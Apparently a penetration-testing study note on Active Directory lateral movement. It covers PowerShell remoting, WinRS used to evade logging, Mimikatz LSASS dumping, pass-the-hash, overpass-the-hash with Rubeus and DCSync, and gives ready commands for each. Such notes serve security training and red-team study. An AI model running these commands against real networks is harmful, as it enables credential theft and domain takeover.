* In lateral movement, we aim to connect different computers in active directory domain, gaining administrative privileges and dumping LSASS process.
### PowerShell Remoting
* PSRemoting uses WinRM which is Microsoft implementation of WS-Management
* PSRemoting uses WinRM and connects by default 5985(HTTP) and 5986(HTTPS).
- PSRemoting enabled by default since Windows Server 2012.
- You may need to enable remoting (Enable-PSRemoting) on the attacker machine, and admin privileges are required to do that.
- As an attacker, you may need to enable remoting (Enable-PSRemoting) on a Desktop Windows machine, Administrative privileges are required to do that.
- You get elevated shell on remote system.
- The remoting process runs as a high integrity process.
- **One-to-One**
    - PSSession - Interactive, Runs in a new process, Stateful
    - `New-PSSession` AND `Enter-PSSession` cmdlets are useful for one-to-one PSRemoting approach.
- **One-to-Many**
    - Non-interactive, executes commands parellely.
    - `Invoke-Command` cmdlet are useful for one-to-many PSRemoting approach.
- The best thing in PowerShell for passing the hashes, using credentials and executing commands on multiple remote computers.
- Use `-Credential` parameter to pass username/password.
- `Invoke-Command -ScriptBlock {Get-Process} -FilePath C:\servers.txt`

* `Invoke-Command -FilePath C:\AD\Tools\Invoke-mimikatz.ps1 -Session $sess`: To import a powershell script to a powershell remote session instance.

* `Enter-PSSession -ComputerName dcorp-adminsrv`: Using PowerShell remoting to connect CLI to any other machine. You need administrator privileges on victim machine.

### WinRS Native Executable
- WinRS in place of PSRemoting to evade the logging.
- `winrs -remote:server1 -u:server1\administrator -p:Pass hostname`
- **COM Objects of WSMan**.

### Mimikatz
* **Once we have an administrator access on a computer, we would need to extract credentials from the computer.**
* **Mimikatz could be used to dump credentials, tickets and more**.
- It's very useful for passing and replaying hashes, tickets and for many exciting Active Directory attacks.
- **Mimikatz needs local administrative privileges to dump credentials from local machine**.
- Mimikatz mostly deals with LSASS.exe windows process which contains passwords, tickets and other security related credentials in Windows.
- Via mimikatz, we can dump LSASS process to read data, or we can generate new credentials to put it to LSASS process.

* From windows attacker machine: 
	* `Invoke-Mimikatz -Command '"sekurlsa::ekeys"'`
	* `SafetyKatz.exe "sekurlsa::ekeys"` 
	* `rundll32.exe C:\Dumpert\Outflank.dll` 
	* `pypkatz.exe live lsa`
* From linux attacker machine: 
	* `physmem2profit` 
	* `impacket-*`

### Pass the Hash (PTH)
* "**Pass the hash**" technique allows users to authenticate computers via NTLM hash instead of passwords.
	* PTH is useful when we need to access local OS users.
	- `"sekurlsa::pth /user:<username> /domain:localhost /ntlm:<ntlm-hash-of-user>"`

### Over Pass the Hash (OPTH)
- "**Over pass the hash**" technique creates TGT tickets from keys. (OPTH)
- The **Overpass The Hash/Pass The Key (PTK)** attack is designed for environments where the traditional NTLM protocol is restricted, and Kerberos authentication takes precedence. This attack leverages the NTLM hash or AES keys of a user to solicit Kerberos tickets, enabling unauthorized access to resources within a network.
	- OPTH is useful when we need to access Active Directory Users to access protected resources by Kerberos protocol. 
	* `.\Rubeus.exe asktgt /domain:<domain-FQDN> /user:<username> /rc4:<user-ntlm-hash> /ptt`
	* The above command starts a PowerShell session with a logon type 9. (Same as `runas /netonly`) When you try to access remote resources, it will use logon type 9 privileges.

### PtH vs OPtH
* **In case PTH, we are using NTLM hashes for local accounts.**
* **In case OPTH, we request a ticket for a valid user in domain by using user's ticket keys.**

* In kerberos, we need tickets to access resources.
- In OverPassTheHash, we simply create tickets claiming valid users to access kerberos protected resources.
- Via OverPassTheHash, we create tickets from NTLM hashes(which is RC4 key for tickets) or AES256 keys.
- OPTH is used to access domain-joined services, PTH is used to access local users.

### DCSync Attack
- To extract credentials from the DC without code execution on DC.
- `"lsadump::dcsync"`
- **By default, domain admins have this permission to run DCSync attack**.
